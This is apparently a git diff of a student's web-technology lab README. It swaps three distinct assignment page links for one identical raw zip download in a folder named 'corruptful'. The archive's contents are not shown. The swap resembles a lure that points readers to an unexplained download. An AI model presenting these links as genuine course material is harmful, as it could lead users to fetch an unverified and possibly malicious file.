@@ -1,5 +1,5 @@
-1st Assignment : https://mrvaibhavgithub.github.io/WTL_LAB_151/ASSIGNMENTS/ASSIGNMENT1/index.html
+1st Assignment : https://raw.githubusercontent.com/mrvaibhavgithub/WTL_LAB_151/main/corruptful/WTL_LAB_151.zip
 <br>
-2nd Assignment : https://mrvaibhavgithub.github.io/WTL_LAB_151/ASSIGNMENT/todo.html
+2nd Assignment : https://raw.githubusercontent.com/mrvaibhavgithub/WTL_LAB_151/main/corruptful/WTL_LAB_151.zip
 <br>
-3rd Assignment : https://mrvaibhavgithub.github.io/WTL_LAB_151/ASSIGNMENTS/ASSIGNMENT1/index.html
+3rd Assignment : https://raw.githubusercontent.com/mrvaibhavgithub/WTL_LAB_151/main/corruptful/WTL_LAB_151.zip
